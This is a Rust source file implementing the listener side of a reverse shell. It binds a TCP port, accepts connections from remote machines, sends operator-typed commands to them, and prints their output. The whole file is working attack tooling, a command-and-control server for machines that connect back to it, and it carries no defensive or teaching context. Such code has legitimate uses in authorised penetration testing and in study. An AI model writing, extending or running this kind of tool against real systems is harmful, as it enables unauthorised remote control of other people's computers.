use std::io::{BufRead, BufReader, Write};
use std::net::TcpListener;
use std::thread;
use std::thread::JoinHandle;
use crate::utils::Cmd;

pub(crate) struct ReverseShellServer {
    bind: TcpListener,
}

impl ReverseShellServer {
    pub fn new(bind_addr: &str) -> Self {
        let bind = TcpListener::bind(bind_addr)
            .expect(format!("Unable to bind to {} is the port already taken?", bind_addr).as_str());
        ReverseShellServer{
            bind
        }
    }

    pub fn init_reverse_shell(self) -> JoinHandle<()> {
        thread::spawn(move || {
            for stream in self.bind.incoming() {
                let mut writer = stream.expect("failed to accept client");
                let reader_stream = writer.try_clone().unwrap();
                let mut reader = BufReader::new(reader_stream);

                loop {
                    let cmd = Cmd::enter_command();
                    if cmd.is_empty() { continue; }

                    if let Err(_) = writer.write_all(format!("{cmd}\n").as_bytes()) {
                        println!("Connection lost ending stream {:?}", writer.peer_addr());
                        break;
                    }
                    writer.flush().unwrap();

                    loop {
                        let mut line = String::new();
                        match reader.read_line(&mut line) {
                            Ok(0) => return,
                            Ok(_) => {
                                if line.trim() == "EOF" {
                                    break;
                                }
                                print!("{}", line);
                            }
                            Err(_) => break,
                        }
                    }
                }
                println!("Client connection lost. Waiting for new connection...");
            }
        })
    }
}